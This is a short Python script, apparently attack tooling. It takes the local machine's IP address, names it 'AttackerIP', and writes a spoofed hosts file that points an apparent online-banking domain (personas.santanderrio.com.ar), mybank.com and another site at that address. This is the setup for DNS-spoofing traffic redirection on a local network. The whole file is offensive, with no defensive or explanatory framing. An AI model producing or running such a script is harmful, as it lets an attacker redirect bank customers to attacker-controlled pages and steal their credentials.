import socket
import netifaces

local_addrs = netifaces.ifaddresses('eth1')
dict_temp=local_addrs[netifaces.AF_INET]
#local_addrs[netifaces.AF_INET] => "[{'broadcast': '192.168.43.255', 'netmask': '255.255.255.0', 'addr': '192.168.43.71'}]"
dict=dict_temp[0]
#print(dict) => {'broadcast': '192.168.43.255', 'netmask': '255.255.255.0', 'addr': '192.168.43.71'}
AttackerIP = dict['addr'] # wlan0 ip addr

with open("/etc/hosts.spoof", "a") as myfile:
    myfile.write(AttackerIP + " binbash.com.ar\n")
    myfile.write(AttackerIP + " www.binbash.com.ar\n")
    myfile.write(AttackerIP + " personas.santanderrio.com.ar\n")
    myfile.write(AttackerIP + " www.personas.santanderrio.com.ar\n")
    myfile.write(AttackerIP + " mybank.com\n")
    myfile.write(AttackerIP + " www.mybank.com\n")

'''
# An alternate way to obtain the host IP address with standard libraries
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("gmail.com", 80))
AttackerIP = (s.getsockname()[0])
print(AttackerIP)
s.close()
'''